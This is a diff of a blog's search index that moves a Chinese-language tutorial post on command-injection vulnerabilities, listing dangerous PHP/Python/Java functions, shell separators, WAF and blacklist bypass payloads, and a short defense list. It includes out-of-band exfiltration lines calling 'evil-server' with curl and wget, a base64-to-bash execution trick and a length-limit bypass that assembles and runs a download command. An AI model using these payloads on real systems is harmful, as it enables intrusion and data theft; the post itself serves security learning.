@@ -176,6 +176,51 @@
       </tags>
   </entry>
   <entry>
+    <title>命令执行漏洞</title>
+    <url>/posts/a43e8dc0.html</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>漏洞源因</strong></p>
+<p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。</p>
+<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>即web服务页面中可以执行系统性命令或函数，导致系统的信息泄露。</p>
+<h2 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">exec()</span><br><span class="line">passthru()</span><br><span class="line">shell_exec() = ``</span><br><span class="line">popen()</span><br><span class="line">peoc()</span><br><span class="line">proc_opne()</span><br><span class="line">pcntl_exec()</span><br></pre></td></tr></table></figure>
+
+<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">popen()</span><br><span class="line">subprocess.call()</span><br><span class="line">spawn()</span><br></pre></td></tr></table></figure>
+
+<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Java.lang.Runtime.getRuntime().exec(command)</span><br></pre></td></tr></table></figure>
+
+<h1 id="常见注入方式"><a href="#常见注入方式" class="headerlink" title="常见注入方式"></a>常见注入方式</h1><p>windows</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|| &amp;&amp; &amp; 分隔</span><br><span class="line">\r\n %d0%d0 换行</span><br><span class="line">反引号解析</span><br><span class="line">$() 替换</span><br><span class="line">|  直接执行后面的语句</span><br><span class="line">|| 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
+
+<p>Linux下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分号分隔</span><br><span class="line">;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">|  直接执行后面的语句</span><br><span class="line">|| 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
+
+<h1 id="无回显注入"><a href="#无回显注入" class="headerlink" title="无回显注入"></a>无回显注入</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash反弹shell</span><br><span class="line">DNS外带数据</span><br><span class="line">http带外：</span><br><span class="line">          curl http://evil-server/$(whoami)</span><br><span class="line">          wget http://evil-server/$(whoami)</span><br><span class="line">无带外时利用sleep或其他逻辑构成bool条件</span><br></pre></td></tr></table></figure>
+
+<h1 id="绕过WAF"><a href="#绕过WAF" class="headerlink" title="绕过WAF"></a>绕过WAF</h1><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt; &gt; &lt;&gt;符号 cat&lt;123</span><br><span class="line">\t</span><br><span class="line">$&#123;IFS&#125;其中&#123;&#125;用来截断，比如cat$IFS2会被认为IFS2是变量名。另外，在后面加个$可以起到截断的作用，一般用$9，因为$9是当前系统shell系统进程的第九个参的持有者，它始终为空字符串。</span><br><span class="line">$IFS$9</span><br><span class="line"></span><br><span class="line">&#123;cat,flag.php&#125; //逗号实现空格功能</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></figure>
+
+<p>liunx绕开空格</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat%09flag</span><br><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">ca\t fl\ag</span><br></pre></td></tr></table></figure>
+
+<h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=l;b=s;$s$b //拼接</span><br><span class="line">当cat flag被过滤时：</span><br><span class="line">a=c;b=at;c=f;d=lag;$a$b $&#123;c&#125;$&#123;d&#125;</span><br><span class="line"></span><br><span class="line">base64 echo &quot;bHM&quot;= | base64 -d //base64编码</span><br><span class="line">echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash (在bash被过滤的情况下可尝试sh)</span><br><span class="line"></span><br><span class="line">/?in/?s &gt; /bin/ls</span><br><span class="line">未定义的初始化变量 cat$4 /etc/passwd</span><br><span class="line"></span><br><span class="line">c&quot;&quot;at fl&#x27;&#x27;ag //单双引号</span><br><span class="line"></span><br><span class="line">c\at fl\ag //反斜线</span><br><span class="line"></span><br><span class="line">正则 (假设/bin/cat: test: 是一个目录)</span><br><span class="line">/???/?[a][t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br><span class="line">/???/?at ????</span><br><span class="line">/???/?[a]&#x27;&#x27;[t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">$# 是传给脚本的参数个数</span><br><span class="line">$0 是脚本本身的名字</span><br><span class="line">$1 是传递给该shell脚本的第一个参数</span><br><span class="line">$2 是传递给该shell脚本的第二个参数</span><br><span class="line">$@ 是传给脚本的所有参数的列表</span><br><span class="line">$* 是以一个单字符串显示所有向脚本传递的参数，与位置变量不同，参数可超过9个</span><br><span class="line">$$ 是脚本运行的当前进程ID号</span><br><span class="line">$? 是显示最后命令的退出状态，0表示没有错误，其他表示有错误</span><br></pre></td></tr></table></figure>
+
+<h2 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;wget\</span><br><span class="line">&gt;foo.\</span><br><span class="line">&gt;com</span><br><span class="line">ls -t&gt;a</span><br><span class="line">sh a</span><br></pre></td></tr></table></figure>
+
+<p>上面的方法为通过命令行重定向写入命令，接着通过ls按时间排序把命令写入文件，最后执行 直接在Linux终端下执行的话,创建文件需要在重定向符号之前添加命令 这里可以使用一些诸如w,[之类的短命令，(使用ls /usr/bin/?查看) 如果不添加命令，需要Ctrl+D才能结束，这样就等于标准输入流的重定向 而在php中 , 使用 shell_exec 等执行系统命令的函数的时候 , 是不存在标准输入流的，所以可以直接创建文件</p>
+<h2 id="cat被过滤"><a href="#cat被过滤" class="headerlink" title="cat被过滤"></a>cat被过滤</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">more:一页一页的显示档案内容  </span><br><span class="line">less:与 more 类似  </span><br><span class="line">head:查看头几行  </span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示  </span><br><span class="line">tail:查看尾几行  </span><br><span class="line">nl：显示的时候，顺便输出行号  </span><br><span class="line">od:以二进制的方式读取档案内容  </span><br><span class="line">vi:一种编辑器，这个也可以查看  </span><br><span class="line">vim:一种编辑器，这个也可以查看  </span><br><span class="line">sort:可以查看  </span><br><span class="line">uniq:可以查看  </span><br><span class="line">file -f:报错出具体内容  </span><br><span class="line">grep  </span><br><span class="line">1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令：  </span><br><span class="line">grep test *file  </span><br><span class="line">strings</span><br></pre></td></tr></table></figure>
+
+<h1 id="常用符号"><a href="#常用符号" class="headerlink" title="常用符号"></a>常用符号</h1><h2 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0a 换行符，需要php环境</span><br><span class="line">%0d 回车符，需要php环境</span><br><span class="line">\n </span><br><span class="line">\r</span><br><span class="line">; 在 shell 中，是”连续指令”，这个与下面的`|`作用类似</span><br><span class="line">| （就是按位或），直接执行|后面的语句</span><br><span class="line">|| （就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp; （就是按位与），&amp;前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; （就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
+
+<h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* 0到无穷个任意字符</span><br><span class="line">? 一个任意字符</span><br><span class="line">[ ] 一个在括号内的字符，e.g. [abcd]</span><br><span class="line">[ - ] 在编码顺序内的所有字符</span><br><span class="line">[^ ] 一个不在括号内的字符</span><br></pre></td></tr></table></figure>
+
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不使用时禁用相应函数</span><br><span class="line">尽量不要执行外部的应用程序或命令</span><br><span class="line">做输入的格式检查</span><br><span class="line">转义命令中的所有shell元字符</span><br><span class="line">                shell元字符包括 #&amp;;`,|*?~&lt;&gt;^()[]&#123;&#125;$\</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>漏洞利用</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>AWD学习日记一</title>
     <url>/posts/2fe68c90.html</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>AWD到时方恨不会，进一年两年没有打线下赛了，脚本也没有了，工具也没有。赶紧跟着大佬复习一波，做一下笔记。</p>
@@ -272,51 +317,6 @@
       </categories>
       <tags>
         <tag>渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>命令执行漏洞</title>
-    <url>/posts/a43e8dc0.html</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>漏洞源因</strong></p>
-<p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。</p>
-<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>即web服务页面中可以执行系统性命令或函数，导致系统的信息泄露。</p>
-<h2 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">exec()</span><br><span class="line">passthru()</span><br><span class="line">shell_exec() = ``</span><br><span class="line">popen()</span><br><span class="line">peoc()</span><br><span class="line">proc_opne()</span><br><span class="line">pcntl_exec()</span><br></pre></td></tr></table></figure>
-
-<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">popen()</span><br><span class="line">subprocess.call()</span><br><span class="line">spawn()</span><br></pre></td></tr></table></figure>
-
-<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Java.lang.Runtime.getRuntime().exec(command)</span><br></pre></td></tr></table></figure>
-
-<h1 id="常见注入方式"><a href="#常见注入方式" class="headerlink" title="常见注入方式"></a>常见注入方式</h1><p>windows</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|| &amp;&amp; &amp; 分隔</span><br><span class="line">\r\n %d0%d0 换行</span><br><span class="line">反引号解析</span><br><span class="line">$() 替换</span><br><span class="line">|  直接执行后面的语句</span><br><span class="line">|| 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
-
-<p>Linux下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分号分隔</span><br><span class="line">;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">|  直接执行后面的语句</span><br><span class="line">|| 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
-
-<h1 id="无回显注入"><a href="#无回显注入" class="headerlink" title="无回显注入"></a>无回显注入</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash反弹shell</span><br><span class="line">DNS外带数据</span><br><span class="line">http带外：</span><br><span class="line">          curl http://evil-server/$(whoami)</span><br><span class="line">          wget http://evil-server/$(whoami)</span><br><span class="line">无带外时利用sleep或其他逻辑构成bool条件</span><br></pre></td></tr></table></figure>
-
-<h1 id="绕过WAF"><a href="#绕过WAF" class="headerlink" title="绕过WAF"></a>绕过WAF</h1><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt; &gt; &lt;&gt;符号 cat&lt;123</span><br><span class="line">\t</span><br><span class="line">$&#123;IFS&#125;其中&#123;&#125;用来截断，比如cat$IFS2会被认为IFS2是变量名。另外，在后面加个$可以起到截断的作用，一般用$9，因为$9是当前系统shell系统进程的第九个参的持有者，它始终为空字符串。</span><br><span class="line">$IFS$9</span><br><span class="line"></span><br><span class="line">&#123;cat,flag.php&#125; //逗号实现空格功能</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></figure>
-
-<p>liunx绕开空格</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat%09flag</span><br><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">ca\t fl\ag</span><br></pre></td></tr></table></figure>
-
-<h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=l;b=s;$s$b //拼接</span><br><span class="line">当cat flag被过滤时：</span><br><span class="line">a=c;b=at;c=f;d=lag;$a$b $&#123;c&#125;$&#123;d&#125;</span><br><span class="line"></span><br><span class="line">base64 echo &quot;bHM&quot;= | base64 -d //base64编码</span><br><span class="line">echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash (在bash被过滤的情况下可尝试sh)</span><br><span class="line"></span><br><span class="line">/?in/?s &gt; /bin/ls</span><br><span class="line">未定义的初始化变量 cat$4 /etc/passwd</span><br><span class="line"></span><br><span class="line">c&quot;&quot;at fl&#x27;&#x27;ag //单双引号</span><br><span class="line"></span><br><span class="line">c\at fl\ag //反斜线</span><br><span class="line"></span><br><span class="line">正则 (假设/bin/cat: test: 是一个目录)</span><br><span class="line">/???/?[a][t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br><span class="line">/???/?at ????</span><br><span class="line">/???/?[a]&#x27;&#x27;[t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">$# 是传给脚本的参数个数</span><br><span class="line">$0 是脚本本身的名字</span><br><span class="line">$1 是传递给该shell脚本的第一个参数</span><br><span class="line">$2 是传递给该shell脚本的第二个参数</span><br><span class="line">$@ 是传给脚本的所有参数的列表</span><br><span class="line">$* 是以一个单字符串显示所有向脚本传递的参数，与位置变量不同，参数可超过9个</span><br><span class="line">$$ 是脚本运行的当前进程ID号</span><br><span class="line">$? 是显示最后命令的退出状态，0表示没有错误，其他表示有错误</span><br></pre></td></tr></table></figure>
-
-<h2 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;wget\</span><br><span class="line">&gt;foo.\</span><br><span class="line">&gt;com</span><br><span class="line">ls -t&gt;a</span><br><span class="line">sh a</span><br></pre></td></tr></table></figure>
-
-<p>上面的方法为通过命令行重定向写入命令，接着通过ls按时间排序把命令写入文件，最后执行 直接在Linux终端下执行的话,创建文件需要在重定向符号之前添加命令 这里可以使用一些诸如w,[之类的短命令，(使用ls /usr/bin/?查看) 如果不添加命令，需要Ctrl+D才能结束，这样就等于标准输入流的重定向 而在php中 , 使用 shell_exec 等执行系统命令的函数的时候 , 是不存在标准输入流的，所以可以直接创建文件</p>
-<h2 id="cat被过滤"><a href="#cat被过滤" class="headerlink" title="cat被过滤"></a>cat被过滤</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">more:一页一页的显示档案内容  </span><br><span class="line">less:与 more 类似  </span><br><span class="line">head:查看头几行  </span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示  </span><br><span class="line">tail:查看尾几行  </span><br><span class="line">nl：显示的时候，顺便输出行号  </span><br><span class="line">od:以二进制的方式读取档案内容  </span><br><span class="line">vi:一种编辑器，这个也可以查看  </span><br><span class="line">vim:一种编辑器，这个也可以查看  </span><br><span class="line">sort:可以查看  </span><br><span class="line">uniq:可以查看  </span><br><span class="line">file -f:报错出具体内容  </span><br><span class="line">grep  </span><br><span class="line">1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令：  </span><br><span class="line">grep test *file  </span><br><span class="line">strings</span><br></pre></td></tr></table></figure>
-
-<h1 id="常用符号"><a href="#常用符号" class="headerlink" title="常用符号"></a>常用符号</h1><h2 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0a 换行符，需要php环境</span><br><span class="line">%0d 回车符，需要php环境</span><br><span class="line">\n </span><br><span class="line">\r</span><br><span class="line">; 在 shell 中，是”连续指令”，这个与下面的`|`作用类似</span><br><span class="line">| （就是按位或），直接执行|后面的语句</span><br><span class="line">|| （就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp; （就是按位与），&amp;前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; （就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
-
-<h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* 0到无穷个任意字符</span><br><span class="line">? 一个任意字符</span><br><span class="line">[ ] 一个在括号内的字符，e.g. [abcd]</span><br><span class="line">[ - ] 在编码顺序内的所有字符</span><br><span class="line">[^ ] 一个不在括号内的字符</span><br></pre></td></tr></table></figure>
-
-<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不使用时禁用相应函数</span><br><span class="line">尽量不要执行外部的应用程序或命令</span><br><span class="line">做输入的格式检查</span><br><span class="line">转义命令中的所有shell元字符</span><br><span class="line">                shell元字符包括 #&amp;;`,|*?~&lt;&gt;^()[]&#123;&#125;$\</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-      <tags>
-        <tag>漏洞利用</tag>
       </tags>
   </entry>
   <entry>
